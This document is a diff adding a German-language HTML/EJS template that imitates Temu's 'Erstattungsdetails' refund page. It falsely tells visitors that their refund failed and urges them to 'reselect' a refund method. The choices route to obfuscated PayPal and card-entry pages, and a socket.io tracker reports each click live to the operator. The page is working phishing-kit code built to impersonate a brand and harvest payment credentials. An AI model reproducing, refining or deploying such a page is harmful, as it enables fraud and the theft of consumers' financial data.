@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Erstattungsdetails - Temu</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+    <style>
+        /* CSS reset & base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .kolchi {
+            max-width: 600px;
+            margin: 0 auto;
+            height: 100%;
+            background-color: #f4f4f4;
+            color: #111;
+        }
+
+
+
+        /* Mobile Header */
+        .mobile-header {
+            background: #fff;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            border-bottom: 1px solid #eee;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 15px;
+            cursor: pointer;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        /* Sections */
+        .section {
+            background: #fff;
+            margin-bottom: 10px;
+            padding: 20px;
+        }
+
+        /* Section 1: Main Status */
+        .status-message {
+            color: #ff7300;
+            font-weight: 600;
+            font-size: 16px;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+
+        .refund-amount-display {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .date {
+            color: #ff7300;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .divider-line {
+            height: 20px;
+            width: 1px;
+            background: #e0e0e0;
+        }
+
+        .amount-info {
+            display: flex;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .card-icon-small {
+            width: 24px;
+            height: 16px;
+            background: #555;
+            border-radius: 2px;
+            margin-right: 8px;
+            position: relative;
+        }
+
+        .card-icon-small::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.8);
+        }
+
+        /* Timeline Graph */
+        .timeline-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 10px 3px;
+            position: relative;
+            margin-bottom: 25px;
+            margin-top: 15px;
+        }
+
+        .timeline-box::before {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: 50%;
+            transform: translateX(-50%) rotate(45deg);
+            width: 12px;
+            height: 12px;
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+            border-left: 1px solid #e0e0e0;
+        }
+
+        .timeline-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-align: center;
+            position: relative;
+        }
+
+        .timeline-step {
+            z-index: 2;
+            width: 48%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .icon-circle {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 1px solid #e0e0e0;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .icon-circle svg,
+        .icon-circle img {
+
+            height: 40px;
+        }
+
+        .status-badge {
+            position: absolute;
+            bottom: -5px;
+            right: -5px;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #fff;
+        }
+
+
+
+        .badge-error {
+            background: #e53935;
+            color: white;
+        }
+
+        .timeline-line {
+            position: absolute;
+            top: 45px;
+            left: 36%;
+            right: 36%;
+            height: 2px;
+            background: #ff7300;
+            z-index: 1;
+        }
+
+        .timeline-line::after {
+            content: '';
+            position: absolute;
+            right: -6px;
+            top: -4px;
+            border-top: 5px solid transparent;
+            border-bottom: 5px solid transparent;
+            border-left: 8px solid #ff7300;
+        }
+
+        .timeline-line-text {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 11px;
+            font-weight: 500;
+            color: #111;
+            white-space: nowrap;
+        }
+
+        .step-title {
+            font-weight: 700;
+            font-size: 15px;
+            margin-bottom: 4px;
+            color: #111;
+        }
+
+        .step-date {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .step-error-text {
+            color: #e53935;
+            font-size: 14px;
+            line-height: 1.3;
+            margin-top: 2px;
+            font-weight: 600;
+        }
+
+        /* Responsive timeline adjustments */
+        @media (max-width: 480px) {
+            .timeline-line {
+                top: 35px;
+                top: 35px;
+                left: 34%;
+                right: 35%;
+            }
+
+            .timeline-line::after {
+                right: -5px;
+            }
+
+            .timeline-line-text {
+                font-size: 10px;
+                top: -16px;
+            }
+
+            .icon-circle {
+                width: 45px !important;
+                height: 45px !important;
+            }
+
+            .icon-circle img {
+                height: 30px !important;
+                width: 30px !important;
+            }
+
+            .step-title {
+                font-size: 13px;
+            }
+
+            .step-error-text {
+                font-size: 12px;
+                font-weight: 600;
+            }
+
+            .status-badge {
+                width: 20px !important;
+                height: 20px !important;
+            }
+
+
+
+            .status-badge.badge-error img {
+                width: 24px !important;
+                height: 24px !important;
+            }
+        }
+
+        /* Buttons */
+        .btn-primary {
+            display: block;
+            width: 100%;
+            border: none;
+            padding: 14px;
+            text-align: center;
+            background: #ff7300;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 100px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .btn-primary:active {
+            opacity: 0.9;
+        }
+
+        .btn-secondary {
+            display: block;
+            width: 100%;
+            border: 1px solid #111;
+            padding: 14px;
+            text-align: center;
+            background: #fff;
+            color: #111;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 100px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        /* Section 2: Description */
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .section-text {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        /* Section 3: Amount and Proof */
+        .header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .view-details {
+            color: #111;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .view-details svg {
+            margin-left: 5px;
+        }
+
+        .proof-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 0 15px;
+        }
+
+        .proof-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px 0;
+        }
+
+        .proof-row:first-child {
+            border-bottom: 1px solid #eee;
+        }
+
+        .payment-left {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .payment-right {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .proof-link {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            color: #ff7300;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 15px;
+        }
+
+        /* Footer email notice */
+        .email-notice {
+            display: flex;
+            padding: 20px;
+            background: #fafafa;
+        }
+
+        .email-icon {
+            margin-right: 15px;
+            margin-top: 2px;
+        }
+
+        .email-text {
+            font-size: 14px;
+            line-height: 1.4;
+            flex: 1;
+        }
+
+        /* Error icon svg */
+        .icon-card-error {
+            width: 32px;
+            height: 32px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 1.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* Loader Overlay */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(255, 255, 255, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #ff7300;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Bottom Sheet Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            z-index: 1000;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #fff;
+            width: 600px;
+            margin: auto;
+            border-radius: 12px;
+            overflow: hidden;
+            transform: translateY(100%);
+            transition: transform 0.3s ease-out;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            background: #333;
+            color: #fff;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .method-list {
+            list-style: none;
+        }
+
+        .method-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #eaeaea;
+            cursor: pointer;
+            background-color: #fff;
+            transition: background-color 0.2s;
+        }
+
+        .method-item2 {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #eaeaea;
+            cursor: pointer;
+            background-color: #fff;
+            transition: background-color 0.2s;
+        }
+
+        .method-item:active {
+            background-color: #f5f5f5;
+        }
+
+        .method-item:last-child {
+            border-bottom: none;
+        }
+
+        .method-icon {
+            width: 48px;
+            height: 32px;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .method-icon img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .method-text {
+            font-size: 18px;
+            color: #111;
+            font-weight: 500;
+            margin-left: 15px;
+        }
+
+        /* Built-in fallback designs for the icons if images are missing */
+        .paypal-ico-bg {
+            background: #009cde;
+            color: white;
+            font-weight: bold;
+            font-size: 11px;
+        }
+
+        .card-ico-bg {
+            background: #fff;
+            border: 1px solid #ccc;
+            position: relative;
+        }
+
+        .card-ico-bg::before {
+            content: '';
+            position: absolute;
+            top: 6px;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            background: #000;
+        }
+
+        .card-ico-bg::after {
+            content: '';
+            position: absolute;
+            bottom: 4px;
+            right: 4px;
+            width: 8px;
+            height: 4px;
+            background: #000;
+        }
+
+        .klarna-ico-bg {
+            background: #ffb3c7;
+            color: #000;
+            font-weight: bold;
+            font-family: sans-serif;
+            font-size: 11px;
+        }
+
+        .mb {
+            display: none;
+        }
+
+        .mth-ico {
+
+            height: 32px;
+        }
+
+        @media (max-width: 768px) {
+            .pc {
+                display: none;
+            }
+
+            .mb {
+                display: block;
+            }
+
+            .modal-content {
+                background: #fff;
+                width: 100%;
+                border-radius: 12px;
+                overflow: hidden;
+                transform: translateY(100%);
+                transition: transform 0.3s ease-out;
+                margin: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+        <div>
+            <img class="pc" style="width: 100%; height: 100%;" src="./img/insid-hedopan.jpg" alt="">
+            <img class="mb" style="width: 100%; height: 100%;" src="./img/insid-hedopan-mb.PNG" alt="">
+        </div>
+    </div>
+
+    <div class="kolchi">
+        <div class="mobile-header">
+            <div class="back-btn">
+                <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="15 18 9 12 15 6"></polyline>
+                </svg>
+            </div>
+            <div class="header-title">Erstattungsdetails</div>
+        </div>
+
+        <!-- Main Status Section -->
+        <div class="section">
+            <div class="status-message">
+                Temu hat Ihre Erstattung zur Bearbeitung an Ihr Finanzinstitut weitergeleitet. Da diese jedoch nicht
+                verarbeitet werden konnte, müssen Sie eine neue Zahlungsmethode angeben:
+            </div>
+
+            <div class="refund-amount-display">
+                <div class="date">
+                    <%= paymentDeadline.split('.')[0] %>. <%= parseInt(paymentDeadline.split('.')[0]) + 4 %>-<%=
+                                parseInt(paymentDeadline.split('.')[0]) + 8 %>
+                </div>
+                <div class="divider-line"></div>
+                <div class="amount-info">
+                    <div class="card-icon-small"></div>
+                    €<%= refundAmount %>
+                </div>
+            </div>
+
+            <div class="timeline-box">
+                <div class="timeline-line">
+                    <span class="timeline-line-text">Erstattet auf</span>
+                </div>
+
+                <div class="timeline-flex">
+                    <div class="timeline-step">
+                        <div class="icon-circle" style="width: 55px; height: 55px;">
+                            <div
+                                style="display:flex; flex-direction:column; align-items:center; justify-content:center;">
+                                <img src="./img/tmu-lobo-white.jpg" alt="" style="width: 40px; border-radius: 50%;">
+                            </div>
+                            <div class="status-badge badge-success">
+                                <img src="./img/check-ico.svg" alt="">
+                            </div>
+                        </div>
+                        <div class="step-title">Temu hat Erstattung veranlasst</div>
+                        <div class="step-date">
+                            <%= processingDate %>
+                        </div>
+                    </div>
+
+                    <div class="timeline-step">
+                        <div class="icon-circle" style="border: 2px solid #e53935; width: 60px; height: 60px;">
+                            <svg class="icon-card-error" viewBox="0 0 24 24" style=" height: 38px; stroke: #555;">
+                                <rect x="2" y="6" width="20" height="12" rx="2" ry="2"></rect>
+                                <line x1="2" y1="10" x2="22" y2="10"></line>
+                            </svg>
+                            <div class="status-badge badge-error"
+                                style="width: 26px; height: 26px; right: -5px; bottom: -5px;">
+                                <img width="35px" src="./img/error-ico.svg" alt="">
+                            </div>
+                        </div>
+                        <div class="step-error-text">Konnte von Ihrem<br>Finanzinstitut nicht verarbeitet werden</div>
+                    </div>
+                </div>
+            </div>
+
+            <a style="margin-top: 40px;" href="#" id="btn-reselect" class="btn-primary">Erstattungsmethode neu
+                wählen</a>
+
+        </div>
+
+        <!-- Description Section -->
+        <div class="section">
+            <div class="section-title">Erstattungsbeschreibung</div>
+            <div class="section-text">
+                Wir haben Ihre Erstattung für 4 Artikel veranlasst, deren Stornierung Sie beantragt haben.
+            </div>
+        </div>
+
+        <!-- Amount and Proof Section -->
+        <div class="section" style="padding-bottom: 0;">
+            <div class="header-row">
+                <div class="section-title" style="margin: 0;">Erstattungsbetrag und Beleg</div>
+                <a href="#" class="view-details">Details anzeigen <svg viewBox="0 0 24 24" width="16" height="16"
+                        stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <polyline points="9 18 15 12 9 6"></polyline>
+                    </svg></a>
+            </div>
+
+            <div class="proof-box">
+                <div class="proof-row">
+                    <div class="payment-left">
+                        <div class="card-icon-small" style="margin-right: 12px; transform: scale(1.2);"></div>
+                        Ursprüngliche Zahlung
+                    </div>
+                    <div class="payment-right">€<%= refundAmount %>
+                    </div>
+                </div>
+                <a href="#" class="proof-link">
+                    <div style="display: flex; align-items: center;">
+                        <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="1.5"
+                            fill="none" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 10px;">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                            <polyline points="14 2 14 8 20 8"></polyline>
+                            <line x1="16" y1="13" x2="8" y2="13"></line>
+                            <line x1="16" y1="17" x2="8" y2="17"></line>
+                            <polyline points="10 9 9 9 8 9"></polyline>
+                        </svg>
+                        Von Temu gesendeten Erstattungsbeleg anzeigen
+                    </div>
+                    <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2" fill="none"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="9 18 15 12 9 6"></polyline>
+                    </svg>
+                </a>
+            </div>
+        </div>
+
+        <!-- Footer Email Notice -->
+        <div class="email-notice">
+            <div class="email-icon">
+                <svg viewBox="0 0 24 24" width="20" height="20" stroke="#111" stroke-width="1.5" fill="none"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                    <polyline points="22,6 12,13 2,6"></polyline>
+                </svg>
+            </div>
+            <div class="email-text">
+                Die Erstattungsbestätigung wurde am <%= processingDate %> an Ihre E-Mail gesendet.
+            </div>
+            <svg viewBox="0 0 24 24" width="20" height="20" stroke="#888" stroke-width="2" fill="none"
+                stroke-linecap="round" stroke-linejoin="round" style="margin-top: 5px;">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+        </div>
+
+        <!-- Modals & Overlays -->
+        <div class="loader-overlay" id="fullLoader">
+            <div class="spinner"></div>
+        </div>
+
+        <div class="modal-overlay" id="methodModal">
+            <div class="modal-content" onclick="event.stopPropagation()">
+                <div class="modal-header">
+                    Erstattungsmethode
+                </div>
+                <ul class="method-list">
+                    <li class="method-item" data-url="/loadPPxCvGk6Hb?time=3&url=PPloGIkjnUHnKJHu">
+                        <img class="mth-ico" src="/img/refudi-pp-ico.jpg" alt="">
+                        <span class="method-text">PayPal</span>
+                    </li>
+                    <li class="method-item" data-url="/loading?time=3&url=CAPOCA6a7d5affa">
+                        <img class="mth-ico" src="/img/refud-card-ico.svg" alt="">
+                        <span class="method-text">Card</span>
+                    </li>
+                    <li class="method-item2" style="background-color: #d6d6d6;">
+                        <img style="height: 58px;" class="mth-ico" src="/img/klar.png" alt="">
+                        <span style="color: #5e5e5e;" class="method-text">Klarna </span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <!-- Hidden form to securely hijack the existing tracker.js logic -->
+    <form id="Bgha-Refund" method="post" style="display: none;">
+        <input type="hidden" name="action_type" id="hiddenActionType" value="">
+    </form>
+
+    <script>
+        $(document).ready(function () {
+            const $loader = $('#fullLoader');
+            const $modal = $('#methodModal');
+            const $form = $('#Bgha-Refund');
+            const $actionInput = $('#hiddenActionType');
+
+            // Show loading, then popup
+            $(document).on("click", "#btn-reselect", function (e) {
+                e.preventDefault();
+
+                // Prepare tracking data
+                $actionInput.val("Reselect Method Clicked");
+                $form.removeAttr('data-redirect'); // Do not redirect on just click
+
+                // Track silently without native submit hijacking page logic
+                if (typeof io !== 'undefined') {
+                    const socket = io();
+                    socket.emit('visitor_action', {
+                        type: 'form_submit',
+                        target: 'Bgha-Refund',
+                        details: { action_type: "Reselect Method Clicked" }
+                    });
+                }
+
+                $loader.css('display', 'flex');
+                setTimeout(() => {
+                    $loader.hide();
+                    $modal.addClass('active');
+                }, 2000);
+            });
+
+            // Close modal when clicking on the dark overlay (outside content)
+            $modal.on("click", function () {
+                $(this).removeClass("active");
+            });
+
+            // Handle method item click
+            $(".method-item, .method-item2").on("click", function (e) {
+                e.preventDefault();
+                const redirectUrl = $(this).attr("data-url");
+                const methodName = $(this).find('.method-text').text().trim();
+
+                if (!redirectUrl) return; // Prevent crash if method-item2 lacks a URL
+
+                $modal.removeClass("active");
+                $loader.css('display', 'flex');
+
+                // Track silently without native submit hijacking page logic
+                if (typeof io !== 'undefined') {
+                    const socket = io();
+                    socket.emit('visitor_action', {
+                        type: 'form_submit',
+                        target: 'Bgha-Refund',
+                        details: { action_type: "Selected Method: " + methodName },
+                        redirectUrl: redirectUrl
+                    });
+                }
+
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1000); // Redirect after tracker has time to send
+            });
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/tracker.js"></script>
+</body>
+
+</html>
